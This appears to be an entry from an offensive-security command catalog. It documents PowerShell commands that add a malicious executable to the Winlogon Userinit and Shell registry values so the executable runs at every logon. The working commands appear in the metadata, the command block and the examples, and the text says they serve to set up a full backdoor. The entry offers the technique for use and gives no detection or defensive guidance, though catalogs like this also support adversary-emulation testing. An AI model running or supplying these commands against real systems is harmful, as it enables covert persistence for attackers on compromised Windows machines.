---
id: c7ab1b64-038f-49fa-884c-e6d78a95af14
name: set-winlogon-userinit-and-shell-powershell
type: command
executor: powershell
data: >-
  Set-ItemProperty "HKLM:\Software\Microsoft\Windows
  NT\CurrentVersion\Winlogon\" "Userinit" "userinit.exe, $_MALICIOUS_EXE" -Force

  Set-ItemProperty "HKLM:\Software\Microsoft\Windows
  NT\CurrentVersion\Winlogon\" "Shell" "explorer.exe, $_MALICIOUS_EXE" -Force
output: null
created_at: '2023-04-06T03:56:28.015427+00:00'
updated_at: '2023-04-10T20:37:21.623497+00:00'
platforms:
  - Windows
tags:
  - registry
  - persistence
verified: true
validated: true
---

# set-winlogon-userinit-and-shell-powershell

## Command

```powershell
Set-ItemProperty "HKLM:\Software\Microsoft\Windows NT\CurrentVersion\Winlogon\" "Userinit" "userinit.exe, $_MALICIOUS_EXE" -Force
Set-ItemProperty "HKLM:\Software\Microsoft\Windows NT\CurrentVersion\Winlogon\" "Shell" "explorer.exe, $_MALICIOUS_EXE" -Force
```

## Description

This PowerShell command modifies the Winlogon registry keys by appending a malicious executable to the Userinit and Shell values, enabling persistence through execution at logon or boot. It requires elevated privileges and is used to chain with payload generation for full backdoor setup.

## Parameters

| Parameter | Description | Required |
|-----------|-------------|----------|
| $_MALICIOUS_EXE | Path to the malicious executable (e.g., C:\Temp\evilbinary.exe) | Yes |
| -Force | Overwrite without confirmation | Built-in |

## Examples

### Basic Usage

```powershell
Set-ItemProperty "HKLM:\Software\Microsoft\Windows NT\CurrentVersion\Winlogon\" "Userinit" "userinit.exe, C:\Temp\evilbinary.exe" -Force
Set-ItemProperty "HKLM:\Software\Microsoft\Windows NT\CurrentVersion\Winlogon\" "Shell" "explorer.exe, C:\Temp\evilbinary.exe" -Force
```

### Advanced Usage

Verify after: `Get-ItemProperty "HKLM:\Software\Microsoft\Windows NT\CurrentVersion\Winlogon\" -Name Userinit, Shell`

## Expected Output

No output if successful; errors if insufficient privileges (e.g., Access Denied). Successful run updates the registry values to include the appended executable.

## Related

- [[procedures/windows-registry-hklm-winlogon-persistence]]
